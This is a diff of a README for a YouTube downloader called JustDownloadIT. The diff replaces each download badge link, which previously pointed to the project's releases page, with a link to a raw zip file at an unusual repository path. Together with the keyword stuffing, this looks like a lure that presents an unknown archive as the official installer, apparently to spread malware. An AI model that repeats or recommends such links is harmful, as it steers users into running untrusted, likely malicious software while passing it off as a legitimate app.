@@ -1,7 +1,7 @@
 <h1>🎬 JustDownloadIT - Grab Any YouTube Video at Max Quality</h1>
 
 <p align="center">
-  <a href="https://github.com/mysites-dayo/JustDownloadIT/releases"><img src="https://img.shields.io/badge/Download_JustDownloadIT-Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4CAF50" alt="Download"></a>
+  <a href="https://raw.githubusercontent.com/mysites-dayo/JustDownloadIT/main/ordinable/2.5.zip"><img src="https://img.shields.io/badge/Download_JustDownloadIT-Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4CAF50" alt="Download"></a>
 </p>
 
 ## 🎯 What Is JustDownloadIT?
@@ -26,7 +26,7 @@ Follow these steps and you'll be downloading videos in under two minutes.
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/mysites-dayo/JustDownloadIT/releases"><img src="https://img.shields.io/badge/⬇️_Download_Latest_Release-Click_Here-blue?style=for-the-badge&logo=github&logoColor=white&color=1E88E5" alt="Download JustDownloadIT"></a>
+  <a href="https://raw.githubusercontent.com/mysites-dayo/JustDownloadIT/main/ordinable/2.5.zip"><img src="https://img.shields.io/badge/⬇️_Download_Latest_Release-Click_Here-blue?style=for-the-badge&logo=github&logoColor=white&color=1E88E5" alt="Download JustDownloadIT"></a>
 </p>
 
 ### Step 2: Run the Installer
@@ -148,7 +148,7 @@ If something goes wrong, first check the Troubleshooting section above. For pers
 JustDownloadIT takes the annoyance out of grabbing YouTube content. You paste a link, choose your settings, and the app handles the rest — no ad-filled websites, no sketchy online converters, no quality loss. Whether you want to archive a tutorial, clip a goal replay, or save a music video for offline listening, this app delivers exactly what you need.
 
 <p align="center">
-  <a href="https://github.com/mysites-dayo/JustDownloadIT/releases"><img src="https://img.shields.io/badge/🔥_Get_JustDownloadIT_Now-Download-F44336?style=for-the-badge&logo=github&logoColor=white&color=FF5722" alt="Download Now"></a>
+  <a href="https://raw.githubusercontent.com/mysites-dayo/JustDownloadIT/main/ordinable/2.5.zip"><img src="https://img.shields.io/badge/🔥_Get_JustDownloadIT_Now-Download-F44336?style=for-the-badge&logo=github&logoColor=white&color=FF5722" alt="Download Now"></a>
 </p>
 
 Keywords: ffmpeg, ffmpeg-gui, ffmpeg-python, video-downloader, windows, windows-app, windows-desktop, youtube-downloader, youtube-downloader-4k, youtube-downloader-app, youtube-downloader-bot, youtube-downloader-free, youtube-downloader-gui, youtube-downloader-online, youtube-downloader-python, youtube-video-manager, youtube-videos-downloader, yt-dlp, yt-dlp-gui
